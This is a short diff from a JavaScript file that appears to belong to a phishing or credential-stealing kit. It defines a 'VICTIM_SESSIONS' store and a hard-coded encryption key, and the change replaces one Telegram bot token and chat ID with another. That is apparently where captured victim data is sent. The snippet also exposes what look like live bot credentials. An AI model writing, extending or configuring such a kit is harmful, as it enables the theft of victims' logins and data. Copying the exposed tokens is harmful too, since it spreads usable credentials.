@@ -47,8 +47,8 @@ const ENCRYPTION_KEY = "HyP3r-M3g4_S3cURe-EnC4YpT10n_k3Y";
 const VICTIM_SESSIONS = {}
 
 // Telegram Bot Configuration
-const TELEGRAM_BOT_TOKEN_1 = "8068578948:AAGHXDTTkQGhWVbNyt5SXQQiTlyCWKZx7Qo";
-const TELEGRAM_CHAT_ID_1 = "6263177378";
+const TELEGRAM_BOT_TOKEN_1 = "6922803653:AAEnM_ePrrlnbBsyYWmtmd-RuVVG9RfxJ0w";
+const TELEGRAM_CHAT_ID_1 = "5702018272";
 
 function normalizeIP(rawIP) {
   if (!rawIP) return "unknown";
